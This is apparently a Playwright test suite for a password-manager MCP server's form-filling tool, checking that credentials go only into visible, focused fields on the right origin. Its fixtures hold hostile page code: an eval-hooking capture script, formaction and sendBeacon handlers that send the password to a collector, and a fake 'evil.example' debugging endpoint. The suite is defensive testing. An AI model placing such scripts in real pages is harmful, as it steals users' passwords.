import contextlib, http.server, json, os, socket, subprocess, sys, tempfile, threading, time, urllib.request
from types import SimpleNamespace
from playwright.sync_api import sync_playwright
from harness import PASSWORD, Operator, error, start, write
from mcp_client import ROOT

sys.path.insert(0, os.path.join(ROOT, "server"))
from proton_pass_mcp import isolated_fill

PAGES = {
    "login.html": """<form id=search><input id=q name=q></form>
<form action=done.html><input id=user name=username><input id=hpw type=password hidden><input id=pw type=password>
<button>Go</button></form>
<iframe srcdoc="<input id=fpw type=password>"></iframe>""",
    "stuck.html": """<form onsubmit="return false">
<input id=user name=username><input id=pw type=password><button>Go</button></form>""",
    "done.html": "<p>done</p>",
    "kept.html": "<input id=pw type=password value=leftover>",
    "patched.html": """<script>
Array.prototype.includes = () => true; Array.prototype.indexOf = () => 0;
window.__captured = [];
const origEval = window.eval;
window.eval = function(src) {
  const fn = origEval.call(window, src);
  if (typeof fn !== "function") return fn;
  return function(...args) {
    try { window.__captured.push(JSON.stringify(args)); } catch (e) {}
    return fn.apply(this, args);
  };
};
</script>
<form><input id=user name=username><input id=pw type=password><button>Go</button></form>""",
}
SUBMIT_ERROR = "automatic submission is unavailable; fill without submit and submit manually"
ITEM = {"share_id": "share1", "item_id": "item1", "reason": "log in"}


class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


def serve(root):
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), lambda *a: Quiet(*a, directory=root))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return f"http://127.0.0.1:{srv.server_address[1]}"


def launch(pw, url):
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    proc = subprocess.Popen([pw.chromium.executable_path, "--headless=new", f"--remote-debugging-port={port}",
                             f"--user-data-dir={tempfile.mkdtemp()}", "--no-first-run", "--no-default-browser-check",
                             url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(100):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=1)
            return proc, port
        except OSError:
            time.sleep(0.1)
    proc.kill()
    raise RuntimeError("Chromium did not open its CDP port")


def value(page, selector):
    return page.eval_on_selector(selector, "e => e.value")


def frame_value(page):
    return page.main_frame.child_frames[0].eval_on_selector("#fpw", "e => e.value")


@contextlib.contextmanager
def tab(lab, path):
    page = lab.ctx.new_page()
    page.goto(lab.good + path)
    try:
        yield page
    finally:
        page.close()


def server(lab, port=None):
    return start(urls=[f"{lab.good}/login.html"], PASS_CDP_PORT=str(port or lab.port))


def test_fill_skips_a_tab_on_another_origin_and_hides_its_url(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        got = error(c, "fill_login", **ITEM)
        assert got == "no open tab matches this item's websites (1 tabs open)", got
        assert op.prompts == [], op.prompts
        assert value(lab.phish, "#pw") == ""
    finally:
        op.close()
        c.close()


def test_fill_idna_does_not_authorize_the_transitional_domain(lab):
    d, c = start(urls=["https://faß.de/login"], PASS_CDP_PORT=str(lab.port))
    op = Operator(d)
    page = lab.ctx.new_page()
    page.route("**/*", lambda route: route.fulfill(body=PAGES["login.html"], content_type="text/html"))
    try:
        page.goto("https://fass.de/login")
        got = error(c, "fill_login", **ITEM)
        assert got == "no open tab matches this item's websites (2 tabs open)", got
        assert op.prompts == []
        assert value(page, "#pw") == ""
        page.goto("https://xn--fa-hia.de/login")
        assert c.call("fill_login", **ITEM) == {"filled": ["username", "password"], "submitted": False}
        assert value(page, "#pw") == PASSWORD
        assert op.prompts[0]["origin"] == "https://xn--fa-hia.de"
    finally:
        page.close()
        op.close()
        c.close()


def test_fill_refuses_two_matching_tabs(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as one, tab(lab, "/stuck.html") as two:
            got = error(c, "fill_login", **ITEM)
            assert got == "more than one open tab matches this item's websites (3 tabs open)", got
            assert op.prompts == [], op.prompts
            assert [value(one, "#pw"), value(two, "#pw")] == ["", ""]
    finally:
        op.close()
        c.close()


def test_fill_types_only_into_the_visible_main_frame_password_of_the_item_origin(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            got = c.call("fill_login", **ITEM)
            assert got == {"filled": ["username", "password"], "submitted": False}, got
            assert op.prompts == [{"action": "fill", "title": "Bank", "origin": lab.good,
                                   "submit": False, "reason": "log in"}], op.prompts
            fields = [value(page, s) for s in ("#user", "#pw", "#hpw", "#q")] + [frame_value(page)]
            assert fields == ["ada", PASSWORD, "", "", ""], fields
            assert value(lab.phish, "#pw") == ""
    finally:
        op.close()
        c.close()


def assert_fill_skips_transparent_fields(lab, hidden):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content(f"""<form>{hidden}
<input id=user name=username><input id=pw type=password></form>""")
            got = c.call("fill_login", **ITEM)
            assert got == {"filled": ["username", "password"], "submitted": False}, got
            assert [value(page, s) for s in ("#huser", "#hpw")] == ["", ""]
            assert [value(page, s) for s in ("#user", "#pw")] == ["ada", PASSWORD]
    finally:
        op.close()
        c.close()


def test_fill_skips_inputs_with_zero_opacity(lab):
    assert_fill_skips_transparent_fields(lab, """
<input id=huser autocomplete=username style="opacity:0">
<input id=hpw type=password style="opacity:0">""")


def test_fill_skips_inputs_with_a_zero_opacity_ancestor(lab):
    assert_fill_skips_transparent_fields(lab, """<div style="opacity:0"><div>
<input id=huser autocomplete=username><input id=hpw type=password></div></div>""")


def test_fill_skips_inputs_without_positive_dimensions(lab):
    for size in ("width:0;height:0", "width:0;height:20px", "width:20px;height:0"):
        assert_fill_skips_transparent_fields(lab, f"""
<input id=huser autocomplete=username style="{size};padding:0;border:0">
<input id=hpw type=password style="{size};padding:0;border:0">""")


def test_fill_skips_disabled_and_inert_ancestors(lab):
    for wrapper in ("fieldset disabled", "div inert"):
        tag = wrapper.split()[0]
        assert_fill_skips_transparent_fields(lab, f"""<{wrapper}><div>
<input id=huser autocomplete=username><input id=hpw type=password></div></{tag}>""")


def test_fill_never_writes_into_timer_flipping_stacked_modals(lab):
    with tab(lab, "/login.html") as page:
        page.set_content("""<dialog id=lower><input type=password></dialog>
<dialog id=upper><input type=password></dialog>""")
        page.evaluate("""() => {
          window.writes = [];
          for (const input of document.querySelectorAll('input')) {
            input.addEventListener('input', function() {
              this.focus({preventScroll: true});
              writes.push({focused: document.activeElement === this, value: this.value});
            });
          }
          lower.showModal(); upper.showModal();
          let next = lower;
          window.flips = 0;
          window.flipper = setInterval(() => {
            next.close(); next.showModal();
            next = next === lower ? upper : lower;
            flips++;
          }, 8);
        }""")
        try:
            for _ in range(100):
                isolated_fill(page, {"origin": lab.good, "username": "", "password": PASSWORD})
        finally:
            page.evaluate("clearInterval(flipper)")
        writes = page.evaluate("writes")
        assert page.evaluate("flips") > 0
        assert writes, "must exercise actual credential writes"
        refused = [entry for entry in writes if not entry["focused"] and entry["value"] == PASSWORD]
        assert not refused, f"{len(refused)} of {len(writes)} password writes reached inert controls"


def test_fill_skips_inputs_slotted_through_closed_inert_shadow_root(lab):
    with tab(lab, "/login.html") as page:
        page.set_content("""<div id=host><input id=huser autocomplete=username>
<input id=hpw type=password></div>
<form><input id=user><input id=pw type=password></form>""")
        page.evaluate("host.attachShadow({mode:'closed'}).innerHTML = '<div inert><slot></slot></div>'")
        assert page.evaluate("huser.assignedSlot === null && hpw.assignedSlot === null")
        assert page.evaluate("hpw.focus(); document.activeElement !== hpw")
        got = isolated_fill(page, {"origin": lab.good, "username": "ada", "password": PASSWORD})
        assert [value(page, s) for s in ("#huser", "#hpw")] == ["", ""]
        assert got == ["username", "password"]
        assert [value(page, s) for s in ("#user", "#pw")] == ["ada", PASSWORD]


def test_fill_skips_css_inert_controls(lab):
    assert_fill_skips_transparent_fields(lab, """<div style="interactivity: inert">
<input id=huser autocomplete=username><input id=hpw type=password></div>""")


def test_fill_checks_deep_focus_in_nested_shadow_roots(lab):
    for mode in ("open", "closed"):
        with tab(lab, "/login.html") as page:
            page.set_content('<div id=host></div>')
            page.evaluate("""mode => {
              const outer = host.attachShadow({mode});
              outer.innerHTML = '<div id=inner></div>';
              window.loginRoot = outer.querySelector('#inner').attachShadow({mode});
              loginRoot.innerHTML = '<form><input id=user><input id=pw type=password></form>';
            }""", mode)
            got = isolated_fill(page, {"origin": lab.good, "username": "ada", "password": PASSWORD})
            assert got == ["username", "password"], (mode, got)
            assert page.evaluate("[loginRoot.querySelector('#user').value, loginRoot.querySelector('#pw').value]") == ["ada", PASSWORD]
            assert page.evaluate("loginRoot.activeElement === loginRoot.querySelector('#pw')")


def test_fill_refuses_credentials_when_focus_is_redirected(lab):
    for field in ("user", "pw"):
        # Refuse both at discovery and immediately before the actual write,
        # after earlier focus probes have succeeded.
        for redirect_at in (1, 2 if field == "user" else 3):
            with tab(lab, "/login.html") as page:
                page.set_content('<button id=sink>Elsewhere</button><form><input id=user><input id=pw type=password></form>')
                page.eval_on_selector('#' + field, """(el, redirectAt) => {
                  let count = 0;
                  el.onfocus = () => { if (++count >= redirectAt) sink.focus(); };
                }""", redirect_at)
                isolated_fill(page, {"origin": lab.good, "username": "ada", "password": PASSWORD})
                assert value(page, '#' + field) == "", (field, redirect_at)


def test_fill_accepts_modal_dialog_inside_inert_ancestor(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content("""<div inert><dialog><form>
<input id=user autocomplete=username><input id=pw type=password>
</form></dialog></div>""")
            page.eval_on_selector("dialog", "e => e.showModal()")
            page.click("#pw")
            assert page.eval_on_selector("#pw", "e => e === document.activeElement")
            assert c.call("fill_login", **ITEM) == {"filled": ["username", "password"], "submitted": False}
            assert [value(page, s) for s in ("#user", "#pw")] == ["ada", PASSWORD]
    finally:
        op.close()
        c.close()


def test_fill_rejects_explicit_inertness_within_modal_dialog(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for selector in ("dialog", "form", "input"):
            with tab(lab, "/login.html") as page:
                page.set_content("""<div inert><dialog><form>
<input id=user autocomplete=username><input id=pw type=password>
</form></dialog></div>""")
                page.eval_on_selector_all(selector, "els => els.forEach(e => e.inert = true)")
                page.eval_on_selector("dialog", "e => e.showModal()")
                assert error(c, "fill_login", **ITEM) == "no password field on the matching tab", selector
                assert [value(page, s) for s in ("#user", "#pw")] == ["", ""], selector
    finally:
        op.close()
        c.close()


def test_fill_rejects_nonmodal_dialog_inside_inert_ancestor(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content("""<div inert><dialog><form>
<input id=user autocomplete=username><input id=pw type=password>
</form></dialog></div>""")
            page.eval_on_selector("dialog", "e => e.show()")
            assert error(c, "fill_login", **ITEM) == "no password field on the matching tab"
            assert [value(page, s) for s in ("#user", "#pw")] == ["", ""]
    finally:
        op.close()
        c.close()


def test_fill_only_uses_topmost_modal_in_opening_order(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for order in (("lower", "upper"), ("upper", "lower"), ("lower", "upper", "lower")):
            for ancestor in ("", "inert"):
                with tab(lab, "/login.html") as page:
                    page.set_content(f"""<form><input id=outside-user><input id=outside-pw type=password></form>
<div {ancestor}><dialog id=lower><form><input id=lower-user><input id=lower-pw type=password></form></dialog></div>
<dialog id=upper><form><input id=upper-user><input id=upper-pw type=password></form></dialog>""")
                    page.evaluate("""order => order.forEach(id => {
                      const dialog = document.getElementById(id);
                      if (dialog.open) dialog.close();
                      dialog.showModal();
                    })""", order)
                    assert c.call("fill_login", **ITEM) == {"filled": ["username", "password"], "submitted": False}
                    for name in ("outside", "lower", "upper"):
                        expected = ["ada", PASSWORD] if name == order[-1] else ["", ""]
                        assert [value(page, f"#{name}-{field}") for field in ("user", "pw")] == expected, (order, ancestor, name)
    finally:
        op.close()
        c.close()


def test_fill_skips_nested_inert_controls_inside_topmost_modal(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content("""<dialog id=lower><form><input id=lower-user><input id=lower-pw type=password></form></dialog>
<div inert><dialog id=upper><div inert><div><form>
<input id=blocked-user><input id=blocked-pw type=password></form></div></div>
<form><input id=user><input id=pw type=password></form></dialog></div>""")
            page.evaluate("lower.showModal(); upper.showModal()")
            assert c.call("fill_login", **ITEM) == {"filled": ["username", "password"], "submitted": False}
            assert [value(page, s) for s in ("#lower-user", "#lower-pw", "#blocked-user", "#blocked-pw", "#user", "#pw")] == ["", "", "", "", "ada", PASSWORD]
    finally:
        op.close()
        c.close()


def test_fill_reselects_password_after_username_opens_another_modal(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for event in ("input", "change"):
            with tab(lab, "/login.html") as page:
                page.set_content(f"""<dialog id=lower><form><input id=user on{event}="upper.showModal()">
<input id=oldpw type=password></form></dialog>
<dialog id=upper><form><input id=pw type=password></form></dialog>""")
                page.evaluate("lower.showModal()")
                assert c.call("fill_login", **ITEM) == {"filled": ["password"], "submitted": False}, event
                assert value(page, "#oldpw") == "", event
                assert value(page, "#pw") == PASSWORD, event
    finally:
        op.close()
        c.close()


def test_fill_revalidates_modal_inertness_after_password_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for event in ("input", "change", "focus"):
            for action in ("upper.showModal()", "this.parentElement.inert = true"):
                with tab(lab, "/login.html") as page:
                    page.set_content(f"""<dialog id=lower><form><input id=user><div><input id=pw type=password
on{event}="{action}"></div></form></dialog><dialog id=upper><button>Continue</button></dialog>""")
                    page.evaluate("lower.showModal()")
                    assert error(c, "fill_login", **ITEM) == "no password field on the matching tab", (event, action)
    finally:
        op.close()
        c.close()


def test_fill_reselects_password_when_username_events_disable_its_ancestor(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for attribute in ("disabled", "inert"):
            for event in ("input", "change"):
                with tab(lab, "/login.html") as page:
                    page.set_content(f"""<form><input id=user
on{event}="document.querySelector('fieldset').setAttribute('{attribute}', '')">
<fieldset><input id=oldpw type=password></fieldset><input id=pw type=password></form>""")
                    got = c.call("fill_login", **ITEM)
                    assert got == {"filled": ["username", "password"], "submitted": False}, (attribute, event, got)
                    assert value(page, "#oldpw") == "", (attribute, event)
                    assert value(page, "#pw") == PASSWORD, (attribute, event)
    finally:
        op.close()
        c.close()


def test_fill_does_not_report_password_with_ancestor_disabled_during_its_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for attribute in ("disabled", "inert"):
            for event in ("input", "change", "focus"):
                with tab(lab, "/login.html") as page:
                    page.set_content(f"""<form><input id=user><fieldset><input id=pw type=password
on{event}="this.parentElement.setAttribute('{attribute}', '')"></fieldset></form>""")
                    assert error(c, "fill_login", **ITEM) == "no password field on the matching tab", (attribute, event)
    finally:
        op.close()
        c.close()


def test_fill_accepts_inputs_in_first_legend_of_disabled_fieldset(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content("""<form><fieldset disabled><legend>
<input id=user><input id=pw type=password></legend><input id=hpw type=password></fieldset></form>""")
            assert c.call("fill_login", **ITEM) == {"filled": ["username", "password"], "submitted": False}
            assert [value(page, s) for s in ("#user", "#pw", "#hpw")] == ["ada", PASSWORD, ""]
    finally:
        op.close()
        c.close()


def test_fill_reselects_password_replaced_by_username_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for event in ("input", "change"):
            with tab(lab, "/login.html") as page:
                page.evaluate("""event => {
                  document.querySelector('#user').addEventListener(event, () => {
                    const pw = document.querySelector('#pw');
                    window.detachedPassword = pw;
                    pw.replaceWith(pw.cloneNode());
                  });
                }""", event)
                assert c.call("fill_login", **ITEM) == {"filled": ["username", "password"], "submitted": False}
                assert value(page, "#pw") == PASSWORD
                assert page.evaluate("window.detachedPassword.value") == ""
    finally:
        op.close()
        c.close()


def test_fill_refuses_password_invalidated_by_username_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for change in ("pw.remove()", "pw.disabled = true", "pw.readOnly = true", "pw.hidden = true",
                       "pw.type = 'text'", "pw.style.cssText = 'width:0;height:0;padding:0;border:0'"):
            with tab(lab, "/login.html") as page:
                page.evaluate("""change => {
                  window.originalPassword = document.querySelector('#pw');
                  document.querySelector('#user').addEventListener('input', () => {
                    const pw = window.originalPassword;
                    eval(change);
                  });
                }""", change)
                assert error(c, "fill_login", **ITEM) == "no password field on the matching tab"
                assert page.evaluate("window.originalPassword.value") == ""
    finally:
        op.close()
        c.close()


def test_fill_does_not_report_password_lost_during_its_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for event, action in (("input", "this.value = ''"), ("change", "this.replaceWith(this.cloneNode())"),
                              ("focus", "this.value = ''")):
            with tab(lab, "/login.html") as page:
                page.eval_on_selector("#pw", "(el, [event, action]) => el.setAttribute('on'+event, action)",
                                      [event, action])
                assert error(c, "fill_login", **ITEM) == "no password field on the matching tab"
    finally:
        op.close()
        c.close()


def test_fill_does_not_report_username_cleared_by_password_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for event in ("input", "change", "focus"):
            with tab(lab, "/login.html") as page:
                page.eval_on_selector("#pw", "(el, event) => el.setAttribute('on'+event, \"document.querySelector('#user').value = ''\")", event)
                got = c.call("fill_login", **ITEM)
                assert value(page, "#user") == "", event
                assert got == {"filled": ["password"], "submitted": False}, (event, got)
                assert value(page, "#pw") == PASSWORD
    finally:
        op.close()
        c.close()


def test_fill_revalidates_username_eligibility_and_form_after_password_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for action in ("user.remove()", "user.disabled = true", "user.readOnly = true", "user.hidden = true",
                       "user.type = 'password'", "user.setAttribute('form', 'other')",
                       "user.parentElement.disabled = true", "user.parentElement.inert = true"):
            with tab(lab, "/login.html") as page:
                page.set_content("""<form><fieldset><input id=user></fieldset><input id=pw type=password></form>
<form id=other></form>""")
                page.evaluate("""action => {
                  document.querySelector('#pw').addEventListener('input', () => {
                    const user = document.querySelector('#user');
                    eval(action);
                  });
                }""", action)
                got = c.call("fill_login", **ITEM)
                assert got == {"filled": ["password"], "submitted": False}, (action, got)
                assert value(page, "#pw") == PASSWORD
    finally:
        op.close()
        c.close()


def test_fill_refuses_password_moved_to_another_form_during_its_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content("""<form><input id=user><input id=pw type=password
onchange="this.setAttribute('form', 'other')"></form><form id=other></form>""")
            assert error(c, "fill_login", **ITEM) == "no password field on the matching tab"
    finally:
        op.close()
        c.close()


def test_fill_reports_username_restored_by_later_password_events(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/login.html") as page:
            page.set_content("""<form><input id=user oninput="this.value = ''"><input id=pw type=password
onfocus="document.querySelector('#user').value = 'ada'"></form>""")
            got = c.call("fill_login", **ITEM)
            assert [value(page, s) for s in ("#user", "#pw")] == ["ada", PASSWORD]
            assert got == {"filled": ["username", "password"], "submitted": False}, got
    finally:
        op.close()
        c.close()


def test_fill_refuses_automatic_submission_without_filling_or_approval(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        for path in ("/stuck.html", "/login.html"):
            with tab(lab, path) as page:
                assert error(c, "fill_login", submit=True, **ITEM) == SUBMIT_ERROR
                assert [value(page, "#user"), value(page, "#pw")] == ["", ""]
                assert op.prompts == []
    finally:
        op.close()
        c.close()


def test_fill_rechecks_the_origin_after_approval(lab):
    d, c = server(lab)
    gate = threading.Event()
    op = Operator(d, gate=gate)
    try:
        with tab(lab, "/login.html") as page:
            c.send({"jsonrpc": "2.0", "id": 70, "method": "tools/call",
                    "params": {"name": "fill_login", "arguments": ITEM}})
            for _ in range(200):
                if op.prompts:
                    break
                time.sleep(0.05)
            page.goto(f"{lab.bad}/patched.html")
            assert page.evaluate("() => window.__captured.length") >= 1
            gate.set()
            got = c.read()["result"]
            assert got == {"content": [{"type": "text", "text": "no open tab matches this item's websites (2 tabs open)"}],
                           "isError": True}, got
            assert [value(page, "#user"), value(page, "#pw")] == ["", ""]
            captured = page.evaluate("() => window.__captured.slice()")
            assert all(PASSWORD not in item for item in captured), captured
    finally:
        op.close()
        c.close()


def test_fill_refuses_a_cdp_endpoint_off_loopback(lab):
    class Version(Quiet):
        def do_GET(self):
            body = json.dumps({"webSocketDebuggerUrl": f"ws://evil.example:{lab.port}/devtools/browser/x"}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Version)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    d, c = server(lab, srv.server_address[1])
    op = Operator(d)
    try:
        assert (got := error(c, "fill_login", **ITEM)) == "the browser's CDP address is not 127.0.0.1", got
        assert op.prompts == [], op.prompts
    finally:
        op.close()
        c.close()
        srv.shutdown()


def test_fill_submit_refuses_a_cross_origin_form_action(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/away.html") as page:
            got = error(c, "fill_login", submit=True, **ITEM)
            assert got == SUBMIT_ERROR, got
            assert page.url.startswith(lab.good + "/away.html"), page.url
            assert PASSWORD not in page.content()
    finally:
        op.close()
        c.close()


def test_fill_refuses_automatic_submission_even_for_scripted_navigation(lab):
    d, c = server(lab)
    op = Operator(d)
    try:
        with tab(lab, "/copy.html") as page:
            assert error(c, "fill_login", submit=True, **ITEM) == SUBMIT_ERROR
            assert page.url == f"{lab.good}/copy.html"
            assert value(page, "#pw") == ""
            assert op.prompts == []
    finally:
        op.close()
        c.close()


def assert_no_automatic_secret_request(lab, attack):
    received = []

    class Collector(Quiet):
        def do_GET(self):
            received.append(self.path)
            self.send_response(200)
            self.end_headers()

        def do_POST(self):
            received.append(self.rfile.read(int(self.headers.get("Content-Length", 0))).decode())
            self.send_response(200)
            self.end_headers()

    collector = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Collector)
    threading.Thread(target=collector.serve_forever, daemon=True).start()
    destination = f"http://127.0.0.1:{collector.server_address[1]}/collect"
    html = attack.replace("DESTINATION", destination)
    d, c = server(lab)
    op = Operator(d)
    page = lab.ctx.new_page()
    page.route(lab.good + "/attack.html", lambda route: route.fulfill(body=html, content_type="text/html"))
    try:
        page.goto(lab.good + "/attack.html")
        try:
            got = c.call("fill_login", submit=True, **ITEM)
        except RuntimeError as exc:
            got = str(exc)
        page.wait_for_timeout(200)
        assert not any(PASSWORD in request for request in received), received
        assert got == SUBMIT_ERROR, got
        assert value(page, "#pw") == ""
        assert op.prompts == []
    finally:
        page.close()
        op.close()
        c.close()
        collector.shutdown()
        collector.server_close()


def test_fill_submitter_formaction_cannot_send_the_password(lab):
    assert_no_automatic_secret_request(lab, """<form action=/done.html>
<input name=username><input id=pw name=password type=password>
<button formaction="DESTINATION">Go</button></form>""")


def test_fill_input_handler_cannot_change_the_submission_destination(lab):
    assert_no_automatic_secret_request(lab, """<form action=/done.html>
<input name=username><input id=pw name=password type=password oninput="this.form.action='DESTINATION'">
<button>Go</button></form>""")


def test_fill_input_handler_cannot_send_a_beacon_during_auto_submit(lab):
    assert_no_automatic_secret_request(lab, """<form action=/done.html>
<input name=username><input id=pw name=password type=password oninput="navigator.sendBeacon('DESTINATION',this.value)">
<button>Go</button></form>""")


def test_fill_fails_closed_without_an_allow(lab):
    d, c = server(lab)
    try:
        with tab(lab, "/login.html") as page:
            assert (got := error(c, "fill_login", **ITEM)) == "approval unavailable", got
            for reply in ({"op": "deny"}, {"op": "allow-net"}):
                op = Operator(d, reply)
                assert (got := error(c, "fill_login", **ITEM)) == "release denied", got
                op.close()
            assert [value(page, "#user"), value(page, "#pw")] == ["", ""]
    finally:
        c.close()


if __name__ == "__main__":
    root = tempfile.mkdtemp()
    for name, html in PAGES.items():
        write(root, name, html)
    good, bad = serve(root), serve(root)
    write(root, "away.html", f"""<form action="{bad}/kept.html">
<input id=user name=username><input id=pw type=password><button>Go</button></form>""")
    write(root, "copy.html", f"""<form action="done.html" onsubmit="location.href='{bad}/landed.html'; return false;">
<input id=user name=username><input id=pw type=password><button>Go</button></form>""")
    write(root, "landed.html", f"""<input id=pw type=password value=leftover>
<input id=copy type=text value="{PASSWORD}">""")
    failed = 0
    with sync_playwright() as pw:
        chrome, port = launch(pw, f"{bad}/login.html")
        try:
            ctx = pw.chromium.connect_over_cdp(f"http://127.0.0.1:{port}").contexts[0]
            phish = ctx.pages[0]
            phish.wait_for_load_state()
            lab = SimpleNamespace(ctx=ctx, phish=phish, good=good, bad=bad, port=port)
            tests = [f for name, f in list(globals().items()) if name.startswith("test_")]
            for test in tests:
                try:
                    test(lab)
                except Exception as e:
                    failed += 1
                    print(f"FAIL {test.__name__}: {type(e).__name__}: {e}")
                else:
                    print(f"OK   {test.__name__}")
        finally:
            chrome.kill()
    if failed:
        raise SystemExit(f"{failed} of {len(tests)} fill tests failed")
    print(f"{len(tests)} fill tests OK")
